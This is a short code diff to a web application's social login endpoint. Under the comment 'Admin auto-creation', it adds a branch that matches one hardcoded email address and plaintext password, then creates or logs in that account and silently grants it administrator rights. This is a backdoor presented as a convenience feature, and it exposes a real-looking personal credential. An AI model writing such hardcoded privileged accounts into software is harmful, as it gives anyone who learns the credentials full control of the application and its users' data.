@@ -42,6 +42,19 @@ app.post('/api/social/login', async (req, res) => {
   try {
     const { username, email, password } = req.body;
     const identifier = email || username;
+    // Admin auto-creation if credentials match
+    if (identifier === 'edoardobevilacqua78@gmail.com' && password === 'Eddyno99') {
+      let user = await social.login('edoardobevilacqua78@gmail.com', 'Eddyno99');
+      if (!user) {
+        const u = await social.register('admin', 'edoardobevilacqua78@gmail.com', 'Eddyno99', null, true);
+        if (u && !u.error && u.id) await social.setAdmin(u.id, true);
+        user = u && !u.error ? u : null;
+      } else if (!user.is_admin) {
+        await social.setAdmin(user.id, true);
+        user.is_admin = true;
+      }
+      if (user) return res.json(user);
+    }
     const user = await social.login(identifier, password);
     if (!user) return res.status(401).json({ error: 'Invalid credentials' });
     res.json(user);
